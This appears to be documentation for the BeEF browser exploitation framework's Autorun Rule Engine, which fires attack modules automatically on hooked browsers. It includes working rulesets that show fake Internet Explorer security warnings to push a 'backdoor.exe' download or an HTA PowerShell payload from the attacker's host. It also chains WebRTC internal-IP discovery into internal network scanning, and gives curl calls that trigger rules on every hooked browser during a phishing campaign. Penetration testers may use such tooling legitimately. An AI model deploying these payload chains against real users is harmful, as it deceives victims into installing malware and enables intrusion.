## Introduction
The Autorun Rule Engine (ARE from now on) is a core BeEF component which allows you to define rules
that are automatically triggered on the hooked browser if certain conditions are matched.

If you are a BeEF aficionado, you were probably waiting for this from a long time :-) The old static autorun functionality has been removed. The main features of the new ARE are the following:
* **Dynamic** : pre-load rules from <beef_root>/arerules/enabled directory at start-up, or load them at runtime while BeEF is running, then trigger them on each hooked browser. RESTful API calls are documented in detail later here.
* **Non-intrusive** : command modules now have support for returning execution status and result data (useful for chaining). This didn't required a huge refactoring, but some smart changes in the API only. Command modules that are not adapted to be run with nested-forward chaining mode return UNKNOWN status by default. You can still launch them with the sequential chaining mode. If you need to chain modules output/input though, you will need to add one or two lines of dumb-proof JavaScript to the command modules if the rule is in nested-forward chain mode (more on this later here). 
* **Evolving** : you will likely see the ARE evolve to address common client-side needs for the lazy pentester.

## Matching
On successful hook, the ARE checks if any rulesets present in the core_arerules table match against the hooked browsers. Various hooked browser properties are checked:
* Browser type and version
* Operating system type and version
* (WIP) Plugin type/version
* (WIP) OS architecture

## Matching examples
Trigger only on Safari browsers >= 7, on OSX Yosemite or below.
```javascript
{
  "browser": "S",
  "browser_version": ">= 7",
  "os": "OSX",
  "os_version": "<= 10.10"
}
```

Trigger only on Internet Explorer (any version), on Windows 7 or greater.
```javascript
{
  "browser": "IE",
  "browser_version": "ALL",
  "os": "Windows",
  "os_version": ">= 7"
}
```

Trigger only on Firefox (at least version 31), on any Linux system.
```javascript
{
  "browser": "FF",
  "browser_version": ">= 31",
  "os": "Linux",
  "os_version": "ALL"
}
```

The following are the allowed Browser/OS types and version supported with the ARE:
```ruby
  BROWSER = ['FF','C','IE','S','O','ALL']
  OS = ['Linux','Windows','OSX','Android','iOS','BlackBerry','ALL']
  VERSION = ['<','<=','==','>=','>','ALL','Vista','XP']
```
Have a look in browser.js and os.js (<beef_root>/core/main/client) to see exactly what is supported.

## Chaining mode
There are currently two chaining modes implemented, which should cover most of your client-side needs.
### Sequential
Call N modules with different configurable time delays.
Sequential mode wraps module bodies in their own functions, using setTimeout() to call them with a time delay if specified. Execution order is also available to let you write down modules in an organised way in the JSON file, but then call them in different order. 

Note that module execution status is not checked, and results are ignored. Useful if you just want to launch some modules without caring what their status will be (for instance, a bunch of blind XSRFs on a set of targets). Moreover, as explained later, this chaining mode allows you to launch N modules that are not prepared for the BeEF ARE (as in, they don't return information about the execution status or result data).

The resulting wrapper is something like this:
```javascript
 setTimeout(module_one(),   0);
 setTimeout(module_two(),   2000);
 setTimeout(module_three(), 3000);
```

Display a fake notification (target only IE >= 10 on Windows 7 or higher, then after 2 seconds call the Clippy module with a custom Windows-only dropper that was pre-mounted in BeEF.

```javascript
{
  "name": "Ie Fake Notification + Clippy",
  "author": "antisnatchor",
  "browser": "IE",
  "browser_version": ">= 10",
  "os": "Windows",
  "os_version": ">= 7",
  "modules": [
    {
      "name": "fake_notification_ie",
      "condition": null,
      "options": {
        "notification_text":"Internet Explorer SECURITY NOTIFICATION: your browser is outdated and vulnerable to critical security vulnerabilities like CVE-2015-009 and CVE-2014-879. Please update it."
      }
    }
  ,{
      "name": "clippy",
      "condition": null,
      "options": {
        "clippydir": "http://clippy.ajbnet.com/1.0.0/",
        "askusertext": "Your browser appears to be out of date. Would you like to upgrade it?",
        "executeyes": "http://172.16.45.1:3000/updates/backdoor.exe",
        "respawntime":"5000",
        "thankyoumessage":"Thanks for upgrading your browser! Look forward to a safer, faster web!"
      }
    }
  ],
  "execution_order": [0,1],
  "execution_delay": [0,2000],
  "chain_mode": "sequential"
}
```

### Nested-forward
Call N modules, where module N is executed only if N-1 returns a certain status. Module N can use as input the output from module N-1 (eventually mangling it before processing it).

Nested-forward mode wraps module bodies in their own function, then start to execute them from the first, polling for command execution status/results (with configurable polling interval and timeout). After execution of the first module in the chain, depending on the module condition specified, execution will continue or stop.

The following is an example of chaining an internal network fingerprinting activity only if the hooked browser internal IP is known. Two modules are chained: get_internal_ip_webrtc and internal_network_fingerprinting.

```javascript
{
"modules": [
    {"name": "get_internal_ip_webrtc",
      "condition": null,
      "code": null,
      "options": {}
    },
    {"name": "internal_network_fingerprinting",
      "condition": "status==1",
      "code": "var s=get_internal_ip_webrtc_mod_output.split('.');var start=parseInt(s[3])-1;var end=parseInt(s[3])+1;var mod_input = s[0]+'.'+s[1]+'.'+s[2]+'.'+start+'-'+s[0]+'.'+s[1]+'.'+s[2]+'.'+end;",
      "options": {
        "ipRange":"<<mod_input>>",
        "ports":"80",
        "threads":"5",
        "wait":"2",
        "timeout":"10"
      }
    }
  ],
  "execution_order": [0,1],
  "execution_delay": [0, 0],
  "chain_mode": "nested-forward"
}
```

The wrapper created for this rule will be something like:
```javascript
module_one()
if condition
     /* input for the second module is the IP retrieved via the first module, 
      * with code() executed before calling the function
      */
     code()
     module_two(module_one_output) 
```
This is also one of the cases where the second module input expects something different than the first module output, so we need a way to change module output. The code property allows you to specify arbitrary JavaScript (no multilines, one line only). In this specific case, let's assume the output of the first module is 172.16.35.2. The  
second module requires an input like the following though: "start_ip-stop_ip", as in 172.16.35.1-172.16.35.3 for internal network fingerprinting. The following is the code property value for the second module:
```javascript
var s = get_internal_ip_webrtc_mod_output.split('.');
var start = parseInt(s[3])-1;
var end = parseInt(s[3])+1;
var mod_input = s[0]+'.'+s[1]+'.'+s[2]+'.'+start+'-'+s[0]+'.'+s[1]+'.'+s[2]+'.'+end;
```
As you can see it's dumb-proof. Few things to note here:
* **condition** : value 'null' if you just want to proceed with execution. Alternatively you can check for previous command module execution status with:
```javascript
status==1  // continue if previous module execution status is success
status==0  // continue if previous module execution status is unknown
status==-1 // continue if previous module execution status is error
```
* **code**: arbitrary JavaScript as shown above. Use ```<<mod_input>>``` as command module option (input) in the ruleset ( like ```"ipRange":"<<mod_input>>"```), and make sure you declare the ```var mod_input='something';``` variable in the code property value. You can reference previous module's output with ```<command_module_name>_mod_output``` (get_internal_ip_webrtc_mod_output in the previous example). Note that the get_internal_ip_webrtc BeEF command.js was modified to return execution status and result data (internal IP):

```javascript
get_internal_ip_webrtc_mod_output = [beef.are.status_success(), displayAddrs.join(",")];

/*
 * Generic syntax:
 * <module_name>_mod_output = [beef.are.status_success(), module_result_data];
 * beef.are.status_success() -> status 1
 * beef.are.status_unknown() -> status 0 
 * beef.are.status_error()   -> status -1
 */
```

As most command modules are asynchronous, meaning that they might return in a non-deterministic time, it's necessary to poll for command status/results every X milliseconds, until a specified timeout. This is automatically taken care of and polling/timeout values can be specified in the main BeEF config.yaml file:

```yaml
# Autorun Rule Engine
autorun:
  # this is used when rule chain_mode type is nested-forward, needed as command results are checked via setInterval
  # to ensure that we can wait for async command results. The timeout is needed to prevent infinite loops or   eventually 
  # continue execution regardless of results.
  # If you're chaining multiple async modules, and you expect them to complete in more than 5 seconds, increase the   timeout.
  result_poll_interval: 300
  result_poll_timeout: 5000

  # If the modules doesn't return status/results and timeout exceeded, continue anyway with the chain.
  # This is useful to call modules (nested-forward chain mode) that are not returning their status/results.
  continue_after_timeout: true
```

## RESTful API
For easier integration with other tools or with your custom scripts, RESTful APIs are available also for the Autorun Rule Engine.

### Add rule
Ruleset (ie_win_htapowershell.json):
```javascript
{
  "name": "HTA PowerShell",
  "author": "antisnatchor",
  "browser": "IE",
  "browser_version": "ALL",
  "os": "Windows",
  "os_version": ">= 7",
  "modules": [
    {
      "name": "fake_notification_ie",
      "condition": null,
      "options": {
        "notification_text":"Internet Explorer SECURITY NOTIFICATION: your browser is outdated and vulnerable to critical security vulnerabilities like CVE-2015-009 and CVE-2014-879. Please apply the Microsoft Update below:"
      }
    },
    {
      "name": "hta_powershell",
      "condition": null,
      "options": {
        "domain":"http://172.16.45.1:3000",
        "ps_url":"/ps"
      }
    }],
  "execution_order": [0,1],
  "execution_delay": [0,500],
  "chain_mode": "sequential"
}
```
You can add it to BeEF with the following cURL request:
```javascript
curl -H "Content-Type: application/json; charset=UTF-8" --data "@ie_win_htapowershell.json" -X POST http://172.16.45.1:3000/api/autorun/rule/add?token=xyz
```

If the action was successful, you will get the rule_id back, in order to use with other API calls.
### Trigger rule
By default rules are triggered only once when the browser is successfully hooked. However there might be cases where you need to add then trigger immediately a ruleset. For instance, you have 5 rules pre-loaded during your phishing campaign, but none of them cover Android, and at the same time you notice lots of Android targets newly hooked. Well the ARE is flexible enough to let you add (at runtime) new rules, then trigger them when you want on already-hooked browsers.

Following the same example used previously, given that the rule added has id 1, you can trigger it on every online hooked browser with the following:

```javascript
curl http://172.16.45.1:3000/api/autorun/rule/trigger/1?token=xyz
```
### Delete rule
This is quite self-explanatory ;-)

```javascript
curl http://172.16.45.1:3000/api/autorun/rule/delete/1?token=xyz
```
### List rule(s)
If you need to retrieve rule definition data back in JSON, you can do it in two ways:

Getting a specific ruleset (with id 1 in the example):
```javascript
curl http://172.16.45.1:3000/api/autorun/rule/list/1?token=xyz
```

Getting all the rulesets in the database:
```javascript
curl http://172.16.45.1:3000/api/autorun/rule/list/all?token=xyz
```

Both of the call will return something like the following is successful:
```javascript
{
    "success": true,
    "rules": [
        {
            "id": 2,
            "name": "HTA PowerShell",
            ...
        },
        {
            "id": 3,
            "name": "Get Internal IP (WebRTC)",
            ...
        }
    ]
}
```

## Rules examples:
As mentioned earlier on, the ARE is evolving, so there will be likely many more rulesets in the near future.
All public rulesets will be in the main BeEF repository, inside <beef_root>/arerules.
